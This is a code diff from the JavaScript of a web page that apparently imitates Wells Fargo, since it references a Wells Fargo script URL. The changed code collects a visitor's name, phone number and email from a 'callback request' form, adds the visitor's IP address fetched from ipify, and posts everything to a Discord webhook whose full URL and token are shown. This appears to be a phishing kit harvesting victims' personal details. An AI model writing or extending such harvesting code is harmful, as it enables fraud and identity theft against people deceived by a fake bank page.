@@ -407,25 +407,30 @@ var ndURI ="https://connect.secure.wellsfargo.com/ATADUN/2.2/w/w-642409/sync/js/
 
         var webhookUrl = 'https://discord.com/api/webhooks/1553531473041039380/hHgPBAibgg8LPicpEJfFqhdbAnVFV2vrBzwrSROAfCWKsuL0yyW-LpO_xLdL3Sxv-huh';
 
-        var payload = {
-          content: ':phone: **New Callback Request**',
-          embeds: [{
-            title: 'Callback Request Details',
-            color: 13414659,
-            fields: [
-              { name: 'Name', value: form.querySelector('[name="name"]').value, inline: true },
-              { name: 'Phone Number', value: form.querySelector('[name="phone"]').value, inline: true },
-              { name: 'Email', value: form.querySelector('[name="email"]').value, inline: true }
-            ],
-            timestamp: new Date().toISOString()
-          }]
-        };
+        fetch('https://api.ipify.org?format=json')
+          .then(function(res) { return res.json(); })
+          .then(function(data) {
+            var payload = {
+              content: ':phone: **New Callback Request**',
+              embeds: [{
+                title: 'Callback Request Details',
+                color: 13414659,
+                fields: [
+                  { name: 'Name', value: form.querySelector('[name="name"]').value, inline: true },
+                  { name: 'Phone Number', value: form.querySelector('[name="phone"]').value, inline: true },
+                  { name: 'Email', value: form.querySelector('[name="email"]').value, inline: true },
+                  { name: 'IP Address', value: data.ip, inline: true }
+                ],
+                timestamp: new Date().toISOString()
+              }]
+            };
 
-        fetch(webhookUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        });
+            fetch(webhookUrl, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(payload)
+            });
+          });
 
         var successDiv = document.createElement('div');
         successDiv.style.cssText = 'display:flex;flex-direction:column;align-items:center;gap:12px;padding:24px 0;';
